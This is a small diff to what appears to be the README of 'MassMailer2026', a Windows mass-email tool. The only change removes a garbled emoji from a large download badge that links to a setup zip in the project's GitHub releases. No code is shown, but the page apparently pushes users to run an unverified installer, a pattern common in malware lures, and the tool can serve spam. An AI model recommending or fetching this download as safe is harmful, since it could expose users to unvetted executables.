@@ -10,7 +10,7 @@
 
 ## 📥 DOWNLOAD LATEST VERSION
 <a href="https://github.com/gicFlow989/MassMailer2026/releases/download/Release/MassMailer2026.Setup.1.8.8.zip">
-  <img src="https://img.shields.io/badge/���️_DOWNLOAD_NOW-Mass_Mailer_Pro_v1.8.8-2ea44f?style=for-the-badge&logo=windows&logoColor=white" height="60" alt="Download Mass Mailer Pro" />
+  <img src="https://img.shields.io/badge/DOWNLOAD_NOW-Mass_Mailer_Pro_v1.8.8-2ea44f?style=for-the-badge&logo=windows&logoColor=white" height="60" alt="Download Mass Mailer Pro" />
 </a>
 
 <p><em>Click the button above to download the MassMailer2026 Setup (v1.8.8)</em></p>
